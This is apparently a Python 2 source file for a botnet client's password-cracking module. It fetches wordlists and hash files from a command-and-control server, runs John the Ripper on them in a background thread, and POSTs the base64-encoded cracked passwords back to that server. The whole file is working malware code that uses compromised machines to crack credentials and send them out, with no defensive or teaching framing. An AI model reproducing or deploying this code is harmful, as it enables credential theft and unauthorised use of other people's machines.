'''
Created on Dec 21, 2013

@author: Onur
'''

from FeatureModule import FeatureModule
import subprocess
import os
from domain import BotConfig
from threading import Thread
from httplib import HTTPConnection
import urllib

class HashCrackModule(FeatureModule):    
    """ The HashCrackModule class which is able to execute brute force
        hash cracking attacks.
        
        
        Attributes:
            __john: The reference of JTR subprocess.
            DATA_PATH: data path for input files.
    """
    
    __john = None    
    
    DATA_PATH = "data"        
    
    def __init__(self):
        """ Initialize with the module name."""
        super(HashCrackModule, self).__init__("HashCrackModule")
    
    def start(self, *args):
        """ Creates a subprocess of jtr and invokes it
            with the given arguments."""
                
        #args[0] = ['md5', 'wlist.txt', 'hashes.txt']
        #download wordlist and hashes
        self.downloadList(args[0][1])
        self.downloadList(args[0][2])
        
        #prepare command line arguments
        args[0][0] = "--format=" + args[0][0]
        args[0][1] = "--wordlist=" + os.getcwd() + "/" + self.DATA_PATH + "/" + args[0][1]
        args[0][2] = os.getcwd() + "/" + self.DATA_PATH + "/" + args[0][2] 
        
        cline = [BotConfig.JOHN_PATH]
        cline = cline + args[0]
        
        #start the subprocess in a separate thread.
        t = Thread(target=self.__run, args=[cline])
        t.start()
    
    
    def __run(self, cline):
        self.__john = subprocess.Popen(cline,
                             shell=False,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)

        sout, serr = self.__john.communicate()
        
        #prints the results for debug purposes.
        print sout, serr        
        self.getResults()
    
    def stop(self, *args):
        """ Kills the subprocess."""
        self.__john.kill()
        
    def downloadList(self, fileName):
        """ Downloads given file from the C&C
        """
        
        conn = HTTPConnection(BotConfig.SERVER_IP, BotConfig.SERVER_PORT)
        conn.request("GET", "/" + self.DATA_PATH + "/" + fileName)             
        response = conn.getresponse()
        
        if response.status == 200:
            data = response.read()            
                        
            with open("./" + self.DATA_PATH + "/" + fileName, "w") as f:
                f.write(data)        
        
        conn.close()
        
    def getResults(self):      
        """ Returns the cracking results to the C&C 
            via a HTTP POST request.
        """
        
        with open(BotConfig.JOHN_POT_PATH) as f:
            result = f.read()
        
        params = {'result': result.encode('base64')}
        headers = {"Content-type": "application/x-www-form-urlencoded"}
        
        conn = HTTPConnection(BotConfig.SERVER_IP, BotConfig.SERVER_PORT)
        conn.request("POST", "/", urllib.urlencode(params), headers)
        conn.getresponse()
        conn.close()
        
        